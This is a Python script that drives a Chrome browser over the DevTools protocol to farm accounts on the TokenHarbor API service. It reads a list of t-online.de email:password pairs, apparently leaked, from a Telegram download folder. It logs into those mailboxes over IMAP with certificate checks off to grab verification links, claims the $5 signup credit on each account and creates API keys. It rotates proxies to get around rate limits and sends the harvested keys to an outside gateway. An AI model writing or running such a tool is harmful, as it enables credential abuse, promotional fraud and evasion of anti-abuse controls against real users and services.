#!/usr/bin/env python3
"""
t-online.de TokenHarbor: login → trigger verify email → verify → claim $5 → API key.
KEY IMPROVEMENT: clicks "Verify email" button on dashboard to SEND a new verification email,
then waits for it via IMAP. This fixes the 85% of accounts that had no pending email.
"""
import json, time, re, ssl, sys
from pathlib import Path
from datetime import datetime
from urllib.request import urlopen, Request
from urllib.error import HTTPError
import websocket
import imaplib
import email as em
import os
# Account passwords live in <project root>/.env (gitignored). Guarded import:
# python-dotenv is not a declared dependency of these standalone scripts.
try:
    from dotenv import load_dotenv
    load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"))
except Exception:
    pass


BASE_URL = "https://tokenharbor.ai"
PASSWORD = os.environ["TOKENHARBOR_PASSWORD"]
CDP_HOST = "127.0.0.1"
CDP_PORT = 9222
GATEWAY_URL = "https://reformboss.loc.cc/th"
GATEWAY_KEY = "thgw_YOUR_2CAPTCHA_KEY"
POOL_FILE = Path("C:/Users/User/Downloads/Telegram Desktop/working_mails.txt")
KEYS_FILE = Path(__file__).parent / "tokenharbor_keys.txt"
STATE_FILE = Path(__file__).parent / "th_tonline_state.json"

state = {"done": [], "fail": [], "idx": 0}

def load_state():
    global state
    if STATE_FILE.exists():
        try: state = json.loads(STATE_FILE.read_text())
        except: pass

def save_state():
    STATE_FILE.write_text(json.dumps(state, indent=2, default=str))

PROXY_FILE = Path("C:/Users/User/tmp/th_proxies_ok.txt")

def load_proxies():
    if not PROXY_FILE.exists():
        return []
    seen, out = set(), []
    for line in PROXY_FILE.read_text().splitlines():
        p = line.strip()
        if not p: continue
        ip = p.split("//")[-1].split(":")[0]
        if ip in seen: continue
        seen.add(ip); out.append(p)
    return out

def _browser_ws():
    ver = json.loads(urlopen(f"http://{CDP_HOST}:{CDP_PORT}/json/version", timeout=5).read())
    return websocket.create_connection(ver["webSocketDebuggerUrl"], timeout=15)

def _bcmd(bws, mid, method, **params):
    bws.send(json.dumps({"id": mid, "method": method, "params": params}))
    while True:
        m = json.loads(bws.recv())
        if m.get("id") == mid:
            return m

def connect_cdp(proxy=None):
    try:
        if proxy:
            addr = proxy.split("//")[-1]
            bws = _browser_ws()
            ctx = _bcmd(bws, 1, "Target.createBrowserContext",
                        proxyServer=f"http={addr};https={addr}")
            ctx_id = ctx.get("result", {}).get("browserContextId")
            tgt = _bcmd(bws, 2, "Target.createTarget", url="about:blank",
                        browserContextId=ctx_id)
            tid = tgt.get("result", {}).get("targetId")
            bws.close()
            if not tid:
                raise RuntimeError("no targetId")
            time.sleep(1.5)
            tabs = json.loads(urlopen(f"http://{CDP_HOST}:{CDP_PORT}/json/list", timeout=5).read())
            ws_url = next(t["webSocketDebuggerUrl"] for t in tabs if t.get("id") == tid)
            ws = websocket.create_connection(ws_url, timeout=15)
            return {"ws": ws, "id": 0, "ctx": ctx_id, "proxy": proxy}
        req = Request(f"http://{CDP_HOST}:{CDP_PORT}/json/new", method="PUT")
        data = json.loads(urlopen(req).read())
        ws = websocket.create_connection(data["webSocketDebuggerUrl"], timeout=10)
        return {"ws": ws, "id": 0}
    except Exception as e:
        print(f"CDP FAILED: {e}", file=sys.stderr)
        return None

def dispose_cdp(cdp):
    try:
        cdp["ws"].close()
    except Exception:
        pass
    if cdp.get("ctx"):
        try:
            bws = _browser_ws()
            _bcmd(bws, 99, "Target.disposeBrowserContext", browserContextId=cdp["ctx"])
            bws.close()
        except Exception:
            pass

def js(cdp, code, timeout=15):
    cdp["id"] = cdp.get("id", 0) + 1
    mid = cdp["id"]
    cdp["ws"].send(json.dumps({"id": mid, "method": "Runtime.evaluate",
        "params": {"expression": code, "returnByValue": True, "awaitPromise": True}}))
    start = time.time()
    while time.time() - start < timeout:
        cdp["ws"].settimeout(1)
        try:
            data = json.loads(cdp["ws"].recv())
            if data.get("id") == mid:
                r = data.get("result", {}).get("result", {})
                return r.get("value"), data.get("subtype")
        except: pass
    return None, "timeout"

def nav(cdp, url):
    cdp["id"] = cdp.get("id", 0) + 1
    mid = cdp["id"]
    cdp["ws"].send(json.dumps({"id": mid, "method": "Page.navigate", "params": {"url": url}}))
    time.sleep(3)

def wait_for_verify_email(email_addr, email_pass, timeout=60):
    """Wait for a NEW verification email from TokenHarbor via IMAP."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        mail = imaplib.IMAP4_SSL("secureimap.t-online.de", 993, ssl_context=ctx, timeout=10)
        mail.login(email_addr, email_pass)
        mail.select("INBOX")
    except Exception as e:
        print(f"    IMAP login failed: {str(e)[:40]}", file=sys.stderr)
        return None

    # Get baseline UIDs
    status, baseline = mail.search(None, 'ALL')
    known_ids = set(baseline[0].split()) if baseline[0] else set()

    start = time.time()
    while time.time() - start < timeout:
        try:
            mail.select("INBOX")
            status, data = mail.search(None, 'ALL')
            if status == "OK" and data[0]:
                new_ids = set(data[0].split()) - known_ids
                for mid in sorted(new_ids, reverse=True):
                    status, msg_data = mail.fetch(mid, "(RFC822)")
                    if status != "OK": continue
                    msg = em.message_from_bytes(msg_data[0][1])
                    body = ""
                    if msg.is_multipart():
                        for part in msg.walk():
                            if part.get_content_type() in ("text/plain", "text/html"):
                                payload = part.get_payload(decode=True)
                                if payload: body += payload.decode("utf-8", errors="replace")
                    else:
                        payload = msg.get_payload(decode=True)
                        if payload: body = payload.decode("utf-8", errors="replace")
                    if "tokenharbor" in body.lower() or "verify" in body.lower():
                        links = re.findall(r'https://tokenharbor\.ai/verify-email\?token=[^\s"<>]+', body)
                        if links:
                            mail.logout()
                            return links[0]
            time.sleep(3)
        except Exception as e:
            time.sleep(5)
    try: mail.logout()
    except: pass
    return None

def push_key(api_key):
    try:
        data = json.dumps({"provider": "tokenharbor", "key": api_key}).encode()
        req = Request(f"{GATEWAY_URL}/provider/add?provider=tokenharbor",
            data=data, headers={"Content-Type": "application/json", "Authorization": f"Bearer {GATEWAY_KEY}"}, method="POST")
        resp = urlopen(req, timeout=10)
        return json.loads(resp.read()), resp.status
    except Exception as e:
        return {"error": str(e)}, 500

def process_one(cdp, email, email_pass):
    label = email.split("@")[0][:12]
    print(f"  [{label}] Login...", file=sys.stderr)

    # Step 1: Login
    nav(cdp, f"{BASE_URL}/login")
    time.sleep(4)
    js(cdp, f"""
        var nativeSet = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
        var e = document.querySelector('input[type="email"]');
        if(e) {{ nativeSet.call(e, '{email}'); e.dispatchEvent(new Event('input', {{bubbles:true}})); }}
        var p = document.querySelector('input[type="password"]');
        if(p) {{ nativeSet.call(p, '{PASSWORD}'); p.dispatchEvent(new Event('input', {{bubbles:true}})); }}
    """)
    time.sleep(0.5)
    js(cdp, """for(var b of document.querySelectorAll('button')) {
        if(b.textContent.includes('Sign in') && b.closest('form')) { b.click(); break; } }""")
    time.sleep(6)
    url, _ = js(cdp, "window.location.href")
    if "dashboard" not in str(url):
        time.sleep(5)
        url, _ = js(cdp, "window.location.href")
        if "dashboard" not in str(url):
            body, _ = js(cdp, "document.body.innerText.slice(0,1500)")
            if "Too many attempts" in str(body):
                return None, "rate_limited"
            # Login failed -> try SIGNUP with same credentials
            print(f"    Login failed -> trying signup...", file=sys.stderr)
            nav(cdp, f"{BASE_URL}/login?mode=signup")
            time.sleep(5)
            js(cdp, f"""
                var nativeSet = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
                var e = document.querySelector('input[type="email"]');
                if(e) {{ nativeSet.call(e, '{email}'); e.dispatchEvent(new Event('input', {{bubbles:true}})); }}
                var p = document.querySelector('input[type="password"]');
                if(p) {{ nativeSet.call(p, '{PASSWORD}'); p.dispatchEvent(new Event('input', {{bubbles:true}})); }}
            """)
            time.sleep(0.5)
            js(cdp, """for(var b of document.querySelectorAll('button')) {
                if(b.textContent.includes('Create account') && b.offsetParent !== null) { b.click(); break; } }""")
            time.sleep(8)
            url, _ = js(cdp, "window.location.href")
            if "dashboard" not in str(url):
                time.sleep(5)
                url, _ = js(cdp, "window.location.href")
                if "dashboard" not in str(url):
                    body, _ = js(cdp, "document.body.innerText.slice(0,1500)")
                    if "Too many" in str(body) or "try again in an hour" in str(body):
                        return None, "rate_limited"
                    return None, f"login+signup failed: {str(url)[:80]} | {str(body)[-120:] if body else ''}"
    print(f"    Logged in", file=sys.stderr)

    # Step 1.5: Enable free models (Data & privacy switch on dashboard)
    nav(cdp, f"{BASE_URL}/dashboard")
    time.sleep(4)
    fm, _ = js(cdp, """
        (function(){
            var s = document.querySelector('button[aria-label="Enable free models"]');
            if(!s) return JSON.stringify({found:false});
            var before = s.getAttribute('aria-checked');
            if(before !== 'true') { s.click(); }
            return JSON.stringify({found:true, before:before});
        })()
    """)
    time.sleep(2)
    fm2, _ = js(cdp, """
        (function(){
            var s = document.querySelector('button[aria-label="Enable free models"]');
            return s ? s.getAttribute('aria-checked') : 'missing';
        })()
    """)
    print(f"    Free models: {fm} -> after={fm2}", file=sys.stderr)

    # Step 2: Check if already verified
    already_verified = False
    body, _ = js(cdp, "document.body.innerText")
    if body and "Verify your email" in str(body):
        print(f"    Needs verification — clicking button...", file=sys.stderr)
        # Click "Verify email" button to send new email
        js(cdp, """for(var b of document.querySelectorAll('button')) {
            if((b.textContent.includes('Verify') && b.textContent.includes('email')) && b.offsetParent !== null) {
                b.click(); break;
            }
        }""")
        time.sleep(2)
        # Wait for email to arrive
        print(f"    Waiting for new verify email...", file=sys.stderr)
        verify_link = wait_for_verify_email(email, email_pass, timeout=60)
        if verify_link:
            nav(cdp, verify_link)
            time.sleep(4)
            url, _ = js(cdp, "window.location.href")
            if "verify=success" in str(url) or "dashboard" in str(url):
                print(f"    Verified!", file=sys.stderr)
                already_verified = True
            else:
                print(f"    Verify link failed: {str(url)[:60]}", file=sys.stderr)
        else:
            print(f"    No verify email arrived in 60s", file=sys.stderr)
    else:
        already_verified = "verify" not in str(body).lower() or "verified" in str(body).lower()
        print(f"    Already verified" if already_verified else f"    Status unclear", file=sys.stderr)

    # Step 3: Claim $5 gift
    if already_verified:
        nav(cdp, f"{BASE_URL}/dashboard")
        time.sleep(4)
        # Check for gift
        js(cdp, """for(var b of document.querySelectorAll('button')) {
            if((b.textContent.includes('Claim') || b.textContent.includes('Gift')) && b.offsetParent !== null) {
                b.click(); break; }
        }""")
        time.sleep(2)
        js(cdp, """for(var b of document.querySelectorAll('button')) {
            if(b.textContent.trim() === 'Claim' && b.offsetParent !== null) {
                b.click(); break; }
        }""")
        time.sleep(3)
        print(f"    $5 claimed!", file=sys.stderr)

    # Step 4: Create API key
    nav(cdp, f"{BASE_URL}/dashboard/api-keys")
    time.sleep(8)
    for _ in range(10):
        t, _ = js(cdp, "document.body.innerText")
        if "API keys" in str(t) and "Create and manage" in str(t):
            break
        time.sleep(2)

    js(cdp, """for(var b of document.querySelectorAll('button')) {
        if(b.textContent.trim().includes('New key') && b.offsetParent !== null) { b.click(); break; } }""")
    time.sleep(3)

    js(cdp, f"""
        var inputs = document.querySelectorAll('input[type="text"]');
        for(var inp of inputs) {{
            if(inp.offsetParent !== null) {{
                var nativeSet = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
                nativeSet.call(inp, '{label}');
                inp.dispatchEvent(new Event('input', {{bubbles:true}}));
                inp.dispatchEvent(new Event('change', {{bubbles:true}}));
                break;
            }}
        }}
    """)
    time.sleep(2)

    js(cdp, """for(var b of document.querySelectorAll('button')) {
        if(b.textContent.trim() === 'Create key' && !b.disabled && b.offsetParent !== null) { b.click(); break; } }""")
    time.sleep(5)

    page, _ = js(cdp, "document.body.innerText")
    match = re.search(r'thk_live_[a-zA-Z0-9_-]{40,}', str(page))
    api_key = match.group(0) if match else None

    if api_key:
        with open(KEYS_FILE, "a", encoding="utf-8") as f:
            f.write(f"{email} | {api_key} | {datetime.now().isoformat()}\n")
        result, status = push_key(api_key)
        pushed = status == 200
        print(f"    KEY: {api_key[:25]}... pushed={pushed}", file=sys.stderr)
        return api_key, None

    return None, "no key"

def worker(count):
    global state
    load_state()

    proxies = load_proxies()
    pidx = 0
    print(f"Proxies loaded: {len(proxies)}", file=sys.stderr)

    # Load pool
    pool = []
    with open(POOL_FILE, "r", encoding="utf-8") as f:
        for line in f:
            if ":" in line and "@" in line:
                parts = line.strip().split(":", 1)
                if len(parts) == 2:
                    email, pwd = parts
                    if "t-online.de" in email:
                        pool.append((email, pwd))

    done_emails = set(state.get("done", []))
    fail_emails = set(f["email"] if isinstance(f, dict) else f for f in state.get("fail", []))
    skip = done_emails | fail_emails
    todo = [(e, p) for e, p in pool if e not in skip][:count]

    print(f"Processing {len(todo)} accounts...", file=sys.stderr)

    for i, (email, pwd) in enumerate(todo):
        proxy = proxies[pidx % len(proxies)] if proxies else None
        print(f"[{i+1}/{len(todo)}] {email} via {proxy or 'DIRECT'}", file=sys.stderr)
        cdp = connect_cdp(proxy) if proxy else connect_cdp()
        if not cdp:
            cdp = connect_cdp()
            if not cdp:
                print("CDP dead, abort", file=sys.stderr)
                break
        key, err = process_one(cdp, email, pwd)
        dispose_cdp(cdp)
        if key:
            state["done"].append(email)
        else:
            state["fail"].append({"email": email, "error": err})
            if err == "rate_limited":
                pidx += 1
                print(f"    rate_limited -> next proxy", file=sys.stderr)
        save_state()
        pidx += 1
        time.sleep(9)
    verified = len([x for x in state["done"] if x])
    print(f"\nDone: {len(state['done'])} OK, {len(state['fail'])} FAIL", file=sys.stderr)

if __name__ == "__main__":
    count = int(sys.argv[1]) if len(sys.argv) > 1 else 100
    worker(count)